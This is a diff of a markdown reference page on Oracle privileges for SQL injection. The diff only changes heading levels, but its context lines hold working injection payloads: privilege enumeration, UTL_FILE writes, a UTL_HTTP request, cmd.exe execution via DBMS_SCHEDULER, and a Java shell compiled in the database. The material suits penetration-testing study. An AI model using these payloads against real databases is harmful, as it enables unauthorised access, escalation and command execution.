@@ -7,11 +7,9 @@ tags: ["privileges", "escalation", "administration", "security"]
 lastUpdated: 2025-03-15
 ---
 
-## Privileges
-
 Oracle implements a sophisticated privilege system to control access to database objects and functionality. Understanding and enumerating privileges is crucial for advanced SQL injection attacks, as they determine what actions can be performed within the database.
 
-### Privilege Types in Oracle
+## Privilege Types in Oracle
 
 Oracle has several types of privileges:
 
@@ -22,7 +20,7 @@ Oracle has several types of privileges:
 | Role-Based Privileges | Collection of privileges assigned as a group | DBA, CONNECT, RESOURCE roles                   |
 | Code-Based Privileges | Permission to execute procedures             | EXECUTE on packages like UTL_FILE              |
 
-### Enumerating Current Privileges
+## Enumerating Current Privileges
 
 ```sql
 -- Current user's privileges
@@ -38,9 +36,9 @@ SELECT * FROM SESSION_ROLES
 SELECT * FROM USER_TAB_PRIVS
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### Checking Admin Access
+### Checking Admin Access
 
 ```sql
 -- Check if current user has DBA role
@@ -50,7 +48,7 @@ SELECT * FROM USER_TAB_PRIVS
 ' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='SYSDBA') THEN 'SYSDBA FOUND' ELSE 'NO SYSDBA' END, NULL FROM DUAL--
 ```
 
-#### Enumerating All Users' Privileges
+### Enumerating All Users' Privileges
 
 ```sql
 -- List all privileged users (requires elevated privileges)
@@ -60,9 +58,9 @@ SELECT * FROM USER_TAB_PRIVS
 ' UNION SELECT USERNAME, NULL FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE='DBA'--
 ```
 
-### Exploiting Powerful Privileges
+## Exploiting Powerful Privileges
 
-#### File System Access
+### File System Access
 
 If UTL_FILE privilege is available:
 
@@ -77,7 +75,7 @@ If UTL_FILE privilege is available:
 ' BEGIN DECLARE FH UTL_FILE.FILE_TYPE; BEGIN FH := UTL_FILE.FOPEN('DIRECTORY', 'output.txt', 'w'); UTL_FILE.PUT_LINE(FH, 'content'); UTL_FILE.FCLOSE(FH); END; END;--
 ```
 
-#### Network Access
+### Network Access
 
 If UTL_TCP, UTL_HTTP, or UTL_SMTP privileges are available:
 
@@ -89,7 +87,7 @@ If UTL_TCP, UTL_HTTP, or UTL_SMTP privileges are available:
 ' UNION SELECT UTL_HTTP.REQUEST('http://example.com'), NULL FROM DUAL--
 ```
 
-#### Command Execution
+### Command Execution
 
 If DBMS_SCHEDULER privileges exist:
 
@@ -101,9 +99,9 @@ If DBMS_SCHEDULER privileges exist:
 ' BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'CMD_JOB', job_type => 'EXECUTABLE', job_action => 'cmd.exe', number_of_arguments => 3, start_date => SYSDATE, enabled => FALSE, auto_drop => TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB',1,'/c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB',2,'dir'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB',3,'> c:\temp\output.txt'); DBMS_SCHEDULER.ENABLE('CMD_JOB'); END;--
 ```
 
-### Privilege Escalation
+## Privilege Escalation
 
-#### Finding PL/SQL Injection Points
+### Finding PL/SQL Injection Points
 
 ```sql
 -- Enumerate definer rights procedures
@@ -113,7 +111,7 @@ If DBMS_SCHEDULER privileges exist:
 ' UNION SELECT TEXT, NULL FROM ALL_SOURCE WHERE TYPE='PACKAGE BODY' AND TEXT LIKE '%EXECUTE IMMEDIATE%'--
 ```
 
-#### Exploiting Java in the Database
+### Exploiting Java in the Database
 
 ```sql
 -- Check for Java privileges
@@ -123,7 +121,7 @@ If DBMS_SCHEDULER privileges exist:
 ' BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Shell" AS import java.io.*; public class Shell { public static String execute(String cmd) throws Exception { BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream())); StringBuffer sb = new StringBuffer(); String line; while((line=br.readLine()) != null) sb.append(line).append("\n"); return sb.toString(); } }'; END;--
 ```
 
-### Dictionary Views for Privilege Analysis
+## Dictionary Views for Privilege Analysis
 
 ```sql
 -- List available dictionary views
@@ -133,7 +131,7 @@ If DBMS_SCHEDULER privileges exist:
 ' UNION SELECT PRIVILEGE, 'YES' FROM USER_SYS_PRIVS WHERE PRIVILEGE='CREATE ANY TABLE'--
 ```
 
-### Session Privileges
+## Session Privileges
 
 ```sql
 -- Check current session privileges
@@ -143,7 +141,7 @@ If DBMS_SCHEDULER privileges exist:
 ' UNION SELECT ROLE, NULL FROM SESSION_ROLES--
 ```
 
-### Privilege-Restricted Functions
+## Privilege-Restricted Functions
 
 ```sql
 -- Test access to restricted functions
@@ -153,7 +151,7 @@ If DBMS_SCHEDULER privileges exist:
 ' BEGIN SYS.KUPW$WORKER.MAIN('x','x','x','x'); END;--
 ```
 
-### Mitigating Privilege Constraints
+## Mitigating Privilege Constraints
 
 ```sql
 -- Find alternate accessible packages
